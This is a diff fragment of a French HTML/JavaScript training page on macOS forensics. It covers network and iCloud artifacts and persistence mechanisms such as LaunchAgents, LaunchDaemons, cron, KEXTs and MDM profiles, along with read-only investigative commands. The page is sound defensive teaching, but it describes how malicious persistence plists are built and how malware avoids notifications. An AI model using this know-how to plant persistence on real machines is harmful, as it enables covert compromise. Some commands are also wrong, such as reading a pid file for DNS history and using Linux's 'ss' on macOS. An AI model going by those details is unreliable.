+    <strong>Attention</strong> : Time Machine peut être désactivé ou exclu sélectivement — l'absence de sauvegarde est elle-même un indice.`
+  },
+  reseau: {
+    icon: '🌐',
+    title: 'Réseau & iCloud — Connexions et synchronisation',
+    body: `<strong>Connexions actives (live)</strong> : <code>netstat -an</code> · <code>lsof -i</code> · <code>ss -antp</code> — même syntaxe BSD que Linux.<br><br>
+    <strong>Historique DNS</strong> : <code>cat /var/run/mDNSResponder.pid</code> · logs Unified Log subsystem <code>com.apple.mDNSResponder</code>.<br><br>
+    <strong>Wi-Fi historique</strong> : <code>/Library/Preferences/com.apple.airport.preferences.plist</code> — réseaux Wi-Fi connus, dates de connexion, géolocalisation.<br><br>
+    <strong>iCloud</strong> : <code>~/Library/Application Support/CloudDocs/</code> · <code>~/Library/Mobile Documents/</code>. Métadonnées des fichiers synchronisés. Logs Unified Log subsystem <code>com.apple.cloudd</code>.<br><br>
+    <strong>VPN &amp; proxies</strong> : <code>/Library/Preferences/SystemConfiguration/</code> — configurations réseau système. Profils MDM peuvent forcer un proxy ou VPN.`
+  }
+};
+
+function showArtZone(key) {
+  var d = artZones[key];
+  if(!d) return;
+  var p = document.getElementById('art-zone-detail');
+  p.className = 'arch-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.title+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── Persistance details ──
+var persistDetails = {
+  la_user: {
+    icon: '👤',
+    name: 'LaunchAgents utilisateur',
+    body: `<strong>Chemin</strong> : <code>~/Library/LaunchAgents/</code><br>
+    <strong>Déclencheur</strong> : login de l'utilisateur — s'exécutent sous son identité.<br>
+    <strong>Pas besoin de root</strong> → cible favorite des malwares macOS grand public.<br><br>
+    <strong>Structure d'un plist malveillant typique</strong> :<br>
+    · <code>Label</code> : identifiant (souvent imite un service Apple légitime)<br>
+    · <code>ProgramArguments</code> : commande à exécuter (vérifier les paths inhabituels)<br>
+    · <code>RunAtLoad</code> : <code>true</code> = exécution immédiate au chargement<br>
+    · <code>KeepAlive</code> : <code>true</code> = relance automatique si le processus meurt<br>
+    · <code>StartInterval</code> : exécution périodique en secondes<br><br>
+    <strong>Commandes forensiques</strong> :<br>
+    <code>ls -la ~/Library/LaunchAgents/</code><br>
+    <code>plutil -convert xml1 suspicious.plist -o -</code>`
+  },
+  la_sys: {
+    icon: '🖥️',
+    name: 'LaunchAgents système',
+    body: `<strong>Chemin</strong> : <code>/Library/LaunchAgents/</code><br>
+    <strong>Déclencheur</strong> : login de <em>n'importe quel</em> utilisateur.<br>
+    <strong>Nécessite root</strong> pour créer/modifier.<br><br>
+    <strong>Distinction avec LaunchDaemons</strong> : les LaunchAgents système ont une interface graphique possible et s'exécutent dans la session utilisateur. Les LaunchDaemons s'exécutent avant toute session, sans GUI.<br><br>
+    <strong>Légitimes courants</strong> : <code>com.adobe.ARMDCHelper.plist</code>, updaters d'applications tierces.<br>
+    <strong>Red flags</strong> : path vers /tmp/, /var/folders/, base64 dans ProgramArguments, absence de signature de code.`
+  },
+  ld: {
+    icon: '🚀',
+    name: 'LaunchDaemons',
+    body: `<strong>Chemin</strong> : <code>/Library/LaunchDaemons/</code><br>
+    <strong>Déclencheur</strong> : démarrage du système — <em>avant</em> toute session utilisateur.<br>
+    <strong>Contexte</strong> : root, pas d'interface graphique, accès réseau immédiat.<br><br>
+    <strong>Valeur forensique</strong> : un daemon malveillant est la persistance la plus robuste sur macOS. Il survit à la déconnexion de l'utilisateur et redémarre avec la machine.<br><br>
+    <strong>Fichiers Apple légitimes</strong> : dans <code>/System/Library/LaunchDaemons/</code> (protégé par SIP — ne peut pas être modifié normalement).<br><br>
+    <strong>Commandes</strong> :<br>
+    <code>sudo launchctl list | grep -v "com.apple"</code><br>
+    <code>find /Library/LaunchDaemons/ -newer /bin/bash -ls</code>`
+  },
+  login: {
+    icon: '🔑',
+    name: 'Login Items / Background Items',
+    body: `<strong>Avant macOS 13</strong> : géré dans les Préférences Système → Comptes → Éléments d'ouverture de session. Stocké dans <code>~/Library/Preferences/com.apple.loginitems.plist</code>.<br><br>
+    <strong>macOS 13+ Ventura</strong> : remplacé par le <strong>Background Task Manager</strong>. Affiche maintenant une notification quand un nouvel élément s'ajoute. Commande : <code>sfltool dumpbtm</code>.<br><br>
+    <strong>Visibilité améliorée</strong> : Apple a volontairement rendu la persistance plus visible aux utilisateurs depuis Ventura — les malwares contournent en utilisant LaunchAgents (pas de notification).<br><br>
+    <strong>Forensique</strong> : vérifier <code>/var/db/com.apple.backgroundtaskmanagement/</code> pour l'historique des background items enregistrés.`
+  },
+  cron: {
+    icon: '🕐',
+    name: 'Cron / Crontab macOS',
+    body: `macOS hérite de cron BSD mais son usage est limité — Apple encourage les LaunchDaemons à la place.<br><br>
+    <strong>Emplacements</strong> :<br>
+    · <code>/var/at/tabs/</code> — crontabs par utilisateur<br>
+    · <code>/etc/crontab</code> — crontab système<br>
+    · <code>/etc/periodic/</code> — scripts périodiques (daily, weekly, monthly)<br><br>
+    <strong>Commandes forensiques</strong> :<br>
+    <code>crontab -l</code> (utilisateur courant)<br>
+    <code>sudo crontab -l -u root</code><br>
+    <code>ls -la /var/at/tabs/</code><br><br>
+    <strong>Note</strong> : cron génère des logs dans l'Unified Log subsystem <code>com.vix.cron</code>.`
+  },
+  kext: {
+    icon: '🧩',
+    name: 'KEXT — Extensions noyau',
+    body: `Les <strong>Kernel Extensions (.kext)</strong> sont des modules qui s'exécutent au niveau du noyau — accès total au système. Utilisés par les rootkits et outils de surveillance.<br><br>
+    <strong>Depuis macOS 10.15 Catalina</strong> : System Extensions remplacent les KEXT. Les anciens KEXT nécessitent une approbation utilisateur explicite.<br><br>
+    <strong>Apple Silicon (M-series)</strong> : les KEXT tiers non signés sont bloqués. Seuls les System Extensions approuvés fonctionnent.<br><br>
+    <strong>Commandes forensiques</strong> :<br>
+    <code>kextstat | grep -v com.apple</code> — KEXT tiers chargés<br>
+    <code>ls /Library/Extensions/</code> — KEXT installés<br>
+    <code>systemextensionsctl list</code> — System Extensions (macOS 10.15+)`
+  },
+  mdm: {
+    icon: '🏢',
+    name: 'Profils MDM — Mobile Device Management',
+    body: `Les profils MDM (.mobileconfig) permettent de configurer un Mac à distance. Légitimes en entreprise, ils peuvent être détournés pour installer des backdoors.<br><br>
+    <strong>Ce qu'un profil MDM peut faire</strong> :<br>
+    · Installer un certificat racine de confiance (permet MITM HTTPS)<br>
+    · Configurer un proxy réseau transparent<br>
+    · Désactiver des fonctions de sécurité (FileVault, Firewall)<br>
+    · Forcer l'installation d'applications<br><br>
+    <strong>Commandes forensiques</strong> :<br>
+    <code>profiles list -all</code> — liste tous les profils<br>
+    <code>profiles show -all</code> — contenu détaillé<br>
+    <code>ls /Library/Managed\ Preferences/</code> — préférences gérées<br><br>
+    <strong>Forensique</strong> : un profil non reconnu par l'entreprise = backdoor ou compromission du MDM.`
+  },
+  at: {
+    icon: '⏱️',
+    name: 'at / periodic — Tâches différées Unix',
+    body: `<strong>at</strong> : exécution unique différée. Commandes soumises avec <code>at &lt;time&gt;</code>, stockées dans <code>/var/at/jobs/</code>. Listables avec <code>atq</code>.<br><br>
+    <strong>periodic</strong> : scripts daily/weekly/monthly dans <code>/etc/periodic/</code> — hérités BSD. Exécutés par launchd selon un calendrier.<br><br>
+    <strong>Valeur forensique</strong> : peu utilisé par les malwares modernes (trop visible, préfèrent LaunchAgents) mais peut servir à déclencher une action différée (ex: effacer des traces à une heure précise).<br><br>
+    <strong>Commandes</strong> : <code>atq</code> (file at) · <code>at -l</code> · <code>ls /var/at/jobs/</code> · <code>ls /etc/periodic/daily/</code>`
+  }
+};
+
+function showPersist(key) {
+  var d = persistDetails[key];
+  if(!d) return;
+  document.querySelectorAll('.meta-card').forEach(function(c){c.classList.remove('sel');});
+  var p = document.getElementById('persist-detail');
+  p.className = 'meta-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.name+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── Scroll progress bar ──
+(function(){
+  var bar = document.getElementById('scroll-progress');
+  var btn = document.getElementById('back-top');
+  window.addEventListener('scroll', function(){
+    var doc = document.documentElement;
+    var scrolled = doc.scrollTop || document.body.scrollTop;
+    var total = doc.scrollHeight - doc.clientHeight;
+    if(bar) bar.style.width = (total > 0 ? (scrolled / total * 100) : 0) + '%';
+    if(btn) btn.classList.toggle('visible', scrolled > 300);
+  });
+})();
+</script>
+</body>
+</html>
